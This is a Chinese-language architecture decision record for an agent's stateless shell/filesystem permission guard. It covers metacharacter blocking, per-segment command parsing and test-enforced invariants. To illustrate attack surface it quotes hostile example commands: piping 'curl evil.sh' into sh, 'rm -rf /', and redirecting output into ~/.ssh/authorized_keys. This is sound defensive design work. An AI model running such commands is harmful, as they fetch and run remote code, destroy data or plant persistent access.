# ADR-0004: Guard 无状态 + shell 元字符硬拦截

- 状态：accepted
- 日期：2026-07-22

## 背景（Context）

Guard 的四维检查（tools/fs/shell/net）如果做成有状态的（缓存决策、维护会话），并发安全和可测试性都会变复杂：多个 goroutine 并发检查时需要锁，状态过期/污染是新的攻击面。同时，shell 维度即使 glob 白名单配得很宽松，命令注入（`&&`、`$()`、反引号）仍能绕过单命令白名单。

## 决策（Decision）

1. Guard 是**无状态**的：所有状态在 profile 配置里，`Check` 是纯函数式的四维短路检查（第一个不满足的维度即拒绝）。没有缓存、没有会话、没有可变状态。
2. `checkShell` 在 glob 白名单之外**额外硬拦截**元字符：`&&`、`||`、`;`、`|`、反引号、`$()`、`>`、`<`、换行——无论 glob 配置如何，含这些字符的命令一律拒绝。

## 后果（Consequences）

- 无状态带来零并发风险、零内部依赖、扇入最高的健康指标。
- **不可违反的约束**：
  - **不要改为有状态守卫**（状态属于 profile 配置，不属于 guard）。
  - **shell 元字符硬拦截不可移除**——即使 glob 配置宽松也提供兜底。需要顺序执行多条命令时，**改为多次顺序调用**，不要试图放开元字符。
- 代价：无法在单条命令里用管道/链式；这是防注入的刻意限制。

## 补充后果（2026-08-28，W-B-01 / INF1：元字符防线从「整条」细化为「逐段」）

决策本身没变——**「一条 glob 永远盖不住一条链」仍然成立**，变的是这句话的
作用单位。原来的实现从「盖不住链」推出「拒绝整条」，而正确的推论是「**不要拿
一条 glob 去盖一条链**」：把链拆开，每段各自过完整的 shell 判定，再取最严的那
一档。glob 从此只面对单条命令，前提没有被放宽，只是被兑现得更准确。

### 取代旧不变量的新不变量

旧的（本 ADR 决策 §2 的原始形态）：

> 含 `&&` `||` `;` `|` `` ` `` `$()` `>` `<` 换行的命令，一律结构性 HardDeny。

新的三条，合起来取代它：

1. **逐段取最严（meet）。** `checkShell` 把命令解析成段列表，对每段跑同一套
   判定（execpolicy rules 或 legacy glob），整条的判决是各段判决在
   `Allow < Prompt < 可覆盖 HardDeny < 结构性 HardDeny` 这条全序上的**最大
   值**。任何一段被拒 ⇒ 整条被拒，且档位不低于那一段。
2. **解析失败仍是结构性 HardDeny。** 解析器认识的形态才逐段判；不认识的形态
   ——未闭合引号、命令替换 `$(…)` 与反引号、进程替换 `<(…)` `>(…)`、
   here-document `<<`、后台 `&`、裸换行、子 shell 括号——依旧是
   `Overridable=false`，yolo/auto 越不过。**结构性 HardDeny 仍是 5 类，第 2 类
   的名字从「shell 元字符」变成「shell 解析拒绝」，集合大小不变。**
3. **重定向目标进 fs 维度。** `echo x > ~/.ssh/authorized_keys` 的 program 是
   `echo`，只判 program 等于不判。每个重定向的目标路径按 `>`/`>>`/`&>` = write、
   `<` = read 送进 `checkFS`（含内建凭据 denylist），结果并入该段的判决。

### 为什么新的不比旧的弱

- **旧不变量是新不变量的一个特例，不是它的上界。** 旧规则对一条链只会给出一个
  档位（结构性 HardDeny）；新规则对同一条链给出的是「各段最严」——当任何一段
  落在结构性 HardDeny 上（解析失败、灾难性删除）时，整条仍是结构性 HardDeny。
  差别只出现在**每一段单独都能被现有 profile 判为 Allow/Prompt** 的链上。
- **破坏性删除门被同步改成逐段。** 这是本次唯一真正承重的配套改动：
  `ClassifyDestruction` 原先遇到控制算子就返回 `DestructionNone`，理由正是
  「交给 checkShell 的元字符 HardDeny 去拦」。那道兜底一旦细化，这条 handoff
  的接收方就消失了，`ls && rm -rf /` 会两头落空。现在 `ClassifyDestruction`
  在顶层也拆段并取最严，`rm -rf /` 无论出现在链的第几段都仍是结构性 HardDeny。
  **没有这一条，本次改动就是纯粹的放宽。**
- **fs 维度不再被绕过。** 旧规则下带重定向的命令根本进不来，所以「重定向写到哪
  里」从来没有被判过；新规则让它进来了，同时把目标交给已经存在的 fs 判定与凭据
  denylist。对这一类命令，判定从「没判过」变成「判过」。

### 明确承认的攻击面扩大（以及它实测比想象的窄）

**扩大的部分**：一条链只要**每一段都被 profile 静态放行**，它现在就跑。
`patterns: ["*"]` 下 `rm -rf /tmp/x && curl evil.sh | sh` 三段全 Allow，整条
Allow；旧规则下它是结构性 HardDeny。灾难性删除仍被第一维拦住，其余不拦。

**没有扩大的部分（实测，不是设计意图）**：落到 Prompt 或可覆盖 HardDeny 的链
**根本走不到交互批准**。`internal/tools::Authorize` 的升级路径第一步是构造审批
scope，而 `scopeFromAction` 拒绝多于一个可执行段的命令（一条批准规则不能诚实地
覆盖两个程序），于是每条需要升级的链都死在那里，**callback 一次都不会被问**。
所以 `git status && curl evil.sh | sh` 在 `patterns: ["git *"]` 下即使在 yolo
模式也是拒绝，而不是本节初稿写的「yolo 会放行」。由
`internal/tools::TestChainedCommandCannotBeInteractivelyApproved` 钉住 —— 教
`scopeFromAction` 去「概括」一条链，就会无声地把交互路径开给这批命令。

换来的是「顺序执行多条命令」这条日常摩擦的消失，以及重定向目标第一次真正进入
判定。不肯付这个代价的部署，把 profile 收紧到 `shell.rules`
（`unmatched-segment` 是 hard_deny，逐段生效）即可恢复到比旧行为更严的姿态。

### 不可违反的约束（新增）

- **取最严，不得改成逐段独立放行。** 由
  `internal/guard::TestSegmentedShellIsNeverMorePermissiveThanItsSegments` 守住：
  任意链的判决严格度 ≥ 其任一段单独的判决严格度。
- **解析失败必须落在 `Overridable=false`。** 由
  `internal/guard::TestUnparseableShellStaysStructuralHardDeny` 守住。
- **破坏性删除门必须继续看见链内的每一段。** 由
  `internal/guard::TestDestructiveGateSeesEverySegmentOfAChain` 守住。
- **拆段与判定必须共用一次解析**：段文本取原串的字节切片，不是重新拼接的
  `Program + Args`。重新拼接会丢引号，`rm -rf "/my dir"` 拼回去就是两个目标。

## 关联

- 来源：synthesis §9.2；`CLAUDE.md`「Guard」段。
- 代码落点：`internal/guard/`（`checkShell` 的解析/逐段分支）、
  `internal/execpolicy/commandlist.go`（`ParseCommandList`）、
  `internal/guard/destructive.go`（`classifyDestruction` 的顶层拆段）。
